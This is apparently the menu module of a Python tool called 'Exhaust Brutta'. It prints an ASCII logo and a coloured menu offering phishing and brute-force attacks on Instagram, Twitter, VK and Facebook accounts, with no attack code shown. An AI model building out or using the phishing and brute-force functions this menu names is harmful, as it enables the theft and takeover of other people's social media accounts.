import os
import sys
from string import Template
from termcolor import colored

colors = {
    "function_alias": (192, 108, 132),
    "function_name": (127, 255, 218),
    "sharp": (53, 92, 125),
    "in_brackets": (0, 173, 181)
}


def rgb_to_ansi(text, r, g, b):
    pattern = "\033[38;2;{r};{g};{b}m{text}\033[0;00m"

    return pattern.format(r=r, g=g, b=b, text=text)


def color(text, value):
    return rgb_to_ansi(text, *colors[value])


def get_choice():
    choice = input(
        colored("exhaust> ", "magenta")
    )

    return choice


def clear_terminal():
    if sys.platform == "windows":
        return os.system("cls")
    else:
        return os.system("clear ")


logo = colored(r'''
 _____      _                     _
| ____|_  _| |__   __ _ _   _ ___| |_
|  _| \ \/ / '_ \ / _` | | | / __| __|
| |___ >  <| | | | (_| | |_| \__ \ |_
|_____/_/\_\_| |_|\__,_|\__,_|___/\__|
             ____             _   _
         ___| __ ) _ __ _   _| |_( ) __ _
        / __|  _ \| '__| | | | __|/ / _` |
        \__ \ |_) | |  | |_| | |_  | (_| |
        |___/____/|_|   \__,_|\__|  \__,_|

   by t.me/batyarimskiy  &  t.me/json1c
          my channel t.me/weaknessinjection
''', "magenta")

menu = Template('''
{$sharp}-----[ $instagram ]----{$sharp}-----[ $twitter ]-----{$sharp}

$f1 $f1_name          $f3 $f3_name
$f2 $f2_name        $f4 $f4_name

{$sharp}-------[ $vk ]--------{$sharp}-----[ $facebook ]-----{$sharp}

$f5 $f5_name	      $f7 $f7_name
$f6 $f6_name	      $f8 $f8_name

$f9 $f9_name

{$sharp}---------------------{$sharp}----------------------{$sharp}
''')

menu = menu.substitute(
    f1=color("{1}", "function_alias"),
    f1_name=color("Фишинг Instagram", "function_name"),
    f2=color("{2}", "function_alias"),
    f2_name=color("Брутфорс Instagram", "function_name"),
    f3=color("{3}", "function_alias"),
    f3_name=color("Фишинг Twitter", "function_name"),
    f4=color("{4}", "function_alias"),
    f4_name=color("Брутфорс Twitter", "function_name"),
    f5=color("{5}", "function_alias"),
    f5_name=color("Фишинг VK", "function_name"),
    f6=color("{6}", "function_alias"),
    f6_name=color("Брутфорс VK", "function_name"),
    f7=color("{7}", "function_alias"),
    f7_name=color("Фишинг Facebook", "function_name"),
    f8=color("{8}", "function_alias"),
    f8_name=color("Брутфорс Facebook", "function_name"),
    f9=color("{9}", "function_alias"),
    f9_name=color("Выход", "function_name"),

    sharp=color("#", "sharp"),
    instagram=color("Instagram", "in_brackets"),
    vk=color("VK", "in_brackets"),
    facebook=color("Facebook", "in_brackets"),
    twitter=color("Twitter", "in_brackets")
)
